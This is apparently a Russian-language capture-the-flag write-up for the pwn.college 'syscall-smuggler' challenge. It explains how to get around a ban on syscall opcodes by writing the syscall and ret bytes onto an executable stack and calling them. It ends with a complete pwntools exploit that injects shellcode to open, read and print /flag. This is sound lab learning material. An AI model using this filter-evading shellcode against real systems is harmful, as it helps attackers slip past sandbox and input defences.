---
title: "pwn.college - syscall-smuggler"
date: "2026-06-22"
category: "pwncollege"
summary: "syscall-smuggler задачка в которой запрещены опкоды команд: syscall, int, sysenter."
---

##### syscall-smuggler задачка в которой запрещены байты команл: syscall, int, sysenter.
окей хорошо но как мы можем сделать системный вызов если опкоды инструкций системных вызовов запрещены задачей.

ответ: нам нужно их скрыть, процессор выполняет то на что указывает регистр `rip` следовательно для того чтобы исполнить системный вызов нам нужно направить `rip` на байты нашей инструкции `syscall` а именно `0x0f05`. И так давайте попробуем, напишем небольшой кусочек кода на ассемблере который открывает файл `/flag`:
```asm
.intel_syntax noprefix
.global _start

_start:
    mov rax, 2
    lea rdi, [rip+flag]
    xor rdx, rdx
    mov byte ptr [rsp], 0x0f
    mov byte ptr [rsp+1], 0x05
    mov byte ptr [rsp+2], 0xc3
    mov r15, rsp
    call r15

flag:
    .string "/flag"
```
Скомпилируем и слинкуем:
```sh
as -o program.o program.s
```
```sh
ld -o program -z execstack program.o
```
`-z execstack` - включает исполняемый стек (по умолчанию стек не исполняемый)
Теперь запустим наш `program` но через программу `strace` для того чтобы видеть системные вызовы которые дергает наша программа:
```sh
strace ./program
```
и это работает значит мы можем так проделать со всеми системными вызовами которые нам нужны для вывода нашего флага в stdout:
![screenshot](https://snipboard.io/OAryL4.jpg)

но подождите ведь я говорил что syscall имеет опкод `0x0f05` в таком случае зачем я еще на стек пушу `0xc3`.
```asm
mov byte ptr [rsp], 0x0f
mov byte ptr [rsp+1], 0x05
mov byte ptr [rsp+2], 0xc3
```
на самом деле все просто `0xc3` - это опкод инструкции `ret` которая берет адрес возврата из стека который как раз таки пушит на стек инструкция `call` и переходит на него. Если мы так не сделаем.
![screenshot](https://snipboard.io/Lgqtc0.jpg)
программа упадет с ошибкой так как процессор просто продолжит дальше идти по стеку и декодировать следующие байты и если он встретит байты которых нет в isa то процесс упадет с ошибкой

Теперь когда мы прояснили все необходимые моменты напишем exploit на python
```python
from pwn import *

context.arch = 'amd64'
shc = asm('''
# open
mov rax, 2
lea rdi, [rip+flag]
xor rdx, rdx
xor rsi, rsi
mov byte ptr [rsp], 0x0f
mov byte ptr [rsp+1], 0x05
mov byte ptr [rsp+2], 0xc3
mov r15, rsp
call r15

# read
mov rdi, rax
xor rax, rax
mov rsi, rsp
add rsi, 0x100
mov rdx, 0x100
call r15

# write
mov rdx, rax
mov rdi, 1
mov rax, 1
call r15

flag:
.string "/flag"
''')

p = process('/challenge/syscall-smuggler')
p.sendline(shc)
p.interactive()
```
